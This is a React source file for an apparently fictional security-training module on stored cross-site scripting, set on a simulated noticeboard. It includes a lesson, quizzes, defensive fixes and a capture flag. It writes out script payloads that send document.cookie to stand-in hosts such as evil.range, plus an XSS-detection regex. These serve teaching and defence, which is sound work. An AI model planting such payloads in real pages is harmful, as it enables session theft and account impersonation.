"use client";

/* Module 6 — Cross-Site Scripting. The noticeboard is (in-fiction) vulnerable:
 * it renders posts as raw HTML, so a stored <script> runs in anyone who views it.
 * SAFETY: we never actually inject or execute the learner's HTML in our own app —
 * posts always render as TEXT; when the input matches an XSS payload we SIMULATE
 * what would happen in the victim's browser (cookie theft). Honest and inert. */

import { useState } from "react";
import Engagement, { type ModuleDef, C, MONO, Btn } from "./Engagement";

const CLASSIC = "<script>fetch('//evil.range/x?c='+document.cookie)</script>";
const XSS_RE = /<script|onerror\s*=|onload\s*=|<img[^>]+src|<svg[^>]+on/i;

function XssAct({ onCapture }: { onCapture: () => void }) {
  const [draft, setDraft] = useState("");
  const [posts, setPosts] = useState<{ text: string; payload: boolean }[]>([
    { text: "Reminder: depot gates close at 8pm sharp.", payload: false },
  ]);
  const [popped, setPopped] = useState(false);

  function post() {
    if (!draft.trim()) return;
    const payload = XSS_RE.test(draft);
    setPosts((ps) => [...ps, { text: draft, payload }]);
    if (payload) { setPopped(true); onCapture(); }
    setDraft("");
  }

  const inp: React.CSSProperties = { width: "100%", padding: "10px 12px", borderRadius: 8, background: C.carbon, color: C.ink, border: `1px solid ${C.line}`, fontFamily: MONO, fontSize: 13 };

  return (
    <div style={{ display: "grid", gap: 14 }}>
      <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "11px 16px", borderBottom: `1px solid ${C.lineSoft}`, background: C.raise }}>
          <i style={dot(C.red)} /><i style={dot(C.amber)} /><i style={dot(C.green)} />
          <span style={{ fontFamily: MONO, fontSize: 11.5, color: C.soft, marginLeft: 6 }}>board.northwind.range · driver noticeboard</span>
        </div>
        <div style={{ padding: 18 }}>
          <div style={{ fontFamily: MONO, fontSize: 11.5, color: C.mute, marginBottom: 10 }}>// this board renders posts as HTML · a manager reviews it hourly</div>
          <div style={{ display: "grid", gap: 8, marginBottom: 14 }}>
            {posts.map((pst, i) => (
              <div key={i} style={{ padding: "9px 12px", borderRadius: 9, background: C.carbon, border: `1px solid ${C.lineSoft}`, fontSize: 13, color: C.soft, wordBreak: "break-word" }}>
                {/* rendered as TEXT — we never execute user HTML in our own app */}
                {pst.payload ? <span style={{ fontFamily: MONO, color: C.amber, fontSize: 12 }}>{pst.text}</span> : pst.text}
              </div>
            ))}
          </div>
          <label style={{ display: "block", fontFamily: MONO, fontSize: 11, color: C.mute, marginBottom: 6 }}>post a note</label>
          <input value={draft} onChange={(e) => setDraft(e.target.value)} placeholder="type a message… or something more" style={inp} />
          <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 12 }}>
            <Btn tone="i" onClick={post}>POST TO BOARD →</Btn>
            <button onClick={() => setDraft(CLASSIC)} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>stuck? use a classic</button>
          </div>
        </div>
      </div>

      {popped && (
        <div className="co-anim co-pop" style={{ background: C.carbon, border: `1px solid ${C.green}`, borderRadius: 12, padding: "14px 16px" }}>
          <div style={{ fontFamily: MONO, fontSize: 10.5, letterSpacing: ".12em", color: C.red, fontWeight: 700, marginBottom: 8 }}>▶ SIMULATED · manager opens the board</div>
          <div style={{ fontFamily: MONO, fontSize: 12.5, color: C.soft, lineHeight: 1.7 }}>
            board renders your post as HTML…<br />
            &nbsp;&nbsp;→ your &lt;script&gt; runs in the manager&rsquo;s browser<br />
            &nbsp;&nbsp;→ <span style={{ color: C.green }}>document.cookie = &quot;session=a1b2c3d4&quot;</span> read<br />
            &nbsp;&nbsp;→ <span style={{ color: C.amber }}>session exfiltrated to evil.range</span> — you can now impersonate them
          </div>
          <div style={{ fontFamily: MONO, fontSize: 11.5, color: C.mute, marginTop: 10 }}>(nothing actually ran — this is the range showing you the impact)</div>
        </div>
      )}
    </div>
  );
}

function dot(c: string): React.CSSProperties { return { width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }; }

export const MODULE6: ModuleDef = {
  code: "M-06",
  moduleNo: 6,
  title: "Cross-Site Scripting",
  client: "Northwind Foods",
  brief:
    "Still at Northwind. Their driver noticeboard lets anyone post a message, and a manager reviews it every hour. The dev team renders those posts straight onto the page. Find out whether a post can do more than just… say something.",
  lesson: {
    blocks: [
      { h: "XSS: your script in someone else’s page", body: "Cross-Site Scripting is injecting your own script into a page that other people view. If an app takes user input and puts it on the page without neutralising it, the browser can’t tell your <script> from the website’s own code — so it just runs it, inside the victim’s session, with all their access." },
      { h: "Stored vs reflected", body: "Reflected XSS bounces your payload back in a single response — usually delivered via a crafted link you trick someone into clicking. Stored XSS is worse: your payload is saved by the app (in a comment, a profile, a noticeboard) and then runs automatically for every person who views that page. This noticeboard is the stored kind." },
      { h: "What a script can steal", body: "Running as the victim, your script can read their session cookie and send it to you — now you’re logged in as them. It can click buttons on their behalf, read what’s on their screen, or log their keystrokes. The lesson underneath: the browser trusts whatever HTML the server hands it, so if user input reaches the page as HTML, it’s game over." },
    ],
    example: {
      caption: "Saved in a comment, this runs in the browser of everyone who loads the page — including an admin — and ships their session cookie to the attacker.",
      lines: [
        { t: "comment saved by attacker:" },
        { t: "  <script>fetch('//evil/'+document.cookie)</script>", leak: true },
        { t: "" },
        { t: "admin opens the page -> script runs as admin", leak: true },
        { t: "  -> admin session cookie sent to evil", leak: true },
      ],
    },
    check: {
      q: "Why does a stored XSS payload run in a victim’s browser?",
      options: [
        { text: "The attacker installed malware on the victim’s computer.", feedback: "No malware needed — the app itself serves the script as part of its page." },
        { text: "The app saved it and sends it as part of the page’s HTML, and the browser runs any script in the page.", correct: true, feedback: "Exactly. To the browser it’s indistinguishable from the site’s own code." },
        { text: "The victim typed the script themselves.", feedback: "The victim just views the page; the attacker’s saved payload runs automatically." },
      ],
    },
  },
  scope: {
    target: "board.northwind.range · the driver noticeboard",
    inScope: "posting to the board as yourself",
    offLimits: "real managers’ accounts, sending data off the range, other hosts",
    timebox: "this session",
  },
  handler: "The board renders posts as HTML and a manager reads it hourly. Post something that isn’t just text — something the page will run. If it would fire in their browser, you’ve got it.",
  hint: "Plain text just shows as text. Post an actual script tag — <script>…document.cookie…</script> — the kind of thing the page will execute when the manager views it.",
  Act: XssAct,
  flag: "flag{st0red_xss_p0pped}",
  defend: {
    blocks: [
      { h: "The fix: encode on output", body: "The cure is to treat user input as data when you put it on a page — never as HTML. ‘Output encoding’ (or escaping) turns characters like < and > into harmless display versions, so a <script> shows up as literal text instead of running. Modern frameworks do this by default; the bugs appear when a developer deliberately renders raw HTML." },
      { h: "Seatbelts: CSP and HttpOnly", body: "Two more layers reduce the damage if a payload slips through. A Content-Security-Policy tells the browser which scripts are allowed to run, blocking injected ones. And marking session cookies HttpOnly means JavaScript can’t read them at all — so even a successful XSS can’t steal the session that way. Neither replaces encoding; they back it up." },
    ],
    check: {
      q: "What’s the primary fix for XSS?",
      options: [
        { text: "Mark cookies HttpOnly.", feedback: "That blocks cookie theft via script, but the XSS still runs and can do other harm. It’s a seatbelt, not the fix." },
        { text: "Encode/escape user content on output so it renders as text, never as HTML.", correct: true, feedback: "Right. If input can’t become HTML, it can’t become script." },
        { text: "Ban the word ‘script’ in user input.", feedback: "Trivially bypassed (event handlers, encodings) and breaks legitimate input. Encode on output instead." },
      ],
    },
  },
  finding: {
    title: "Stored cross-site scripting in driver noticeboard",
    where: "board.northwind.range · noticeboard posts (rendered as HTML)",
    severity: "High",
    cvss: "7.4",
    impact: "Posts are rendered as raw HTML, so a saved <script> runs in every viewer’s browser — including a manager’s — allowing session-cookie theft and account impersonation.",
    fix: "Output-encode all user content so it renders as text; add a Content-Security-Policy and mark session cookies HttpOnly as defence in depth.",
  },
  rep: 55,
  repRank: "Junior Operator",
  repTo: "240 / 300 to Operator",
  next: "NEXT MODULE · Broken Access Control →",
};

export default function Module6() {
  return <Engagement mod={MODULE6} />;
}
